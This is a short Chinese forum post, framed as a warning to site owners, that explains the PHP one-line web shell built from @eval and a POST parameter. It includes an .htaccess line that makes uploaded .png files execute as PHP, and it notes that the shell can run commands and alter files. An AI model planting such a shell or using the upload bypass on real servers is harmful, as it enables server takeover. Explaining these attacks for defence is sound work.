
# [分享] php一句话木马分析

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=2047416
- 抓取时间: 2026-11-01T23:44:17

搭建网站的各位友友们注意了

都2025年了，还有人被 `php` 一句话木马攻击

`php` 一句话木马都要被拉爆了

首先，最外面的是用来告诉网站这个是 `PHP` 程序

不仅需要加上，还要将扩展名改成 `.php` 才能识别成功

或者说你是 `APache`，修改了 `.htaccess` 文件，把 `.htaccess` 文件内容修改成：

```
AddType application/x-httpd-php .png
```

，把 `png` 文件识别成 `php` 文件，这样上传 `png` 文件就可以上传木马了

然后 `@eval()` 的作用是把文本转换成 `php` 代码然后执行

比如我这样输入：

```
@eval("echo 'helloworld'")
```

他就会在当前页面输出一个 `helloworld`

最后 `$_POST['shell']` 是获取 `post` 对应名的参数值

例如我 `POST` 参数为：

```
shell=echo 'helloworld'
```

那么这个 `$_POST['shell']` 就会取出 `echo 'helloworld'`，`@eval()` 再执行 `echo 'helloworld'` 代码

当然，`php` 代码不止有 `echo`，还可以运行终端命令，还可以读取当前目录，还可以读取目录下文件，更可以修改文件了

那咱就只讲到这了，下期再见！
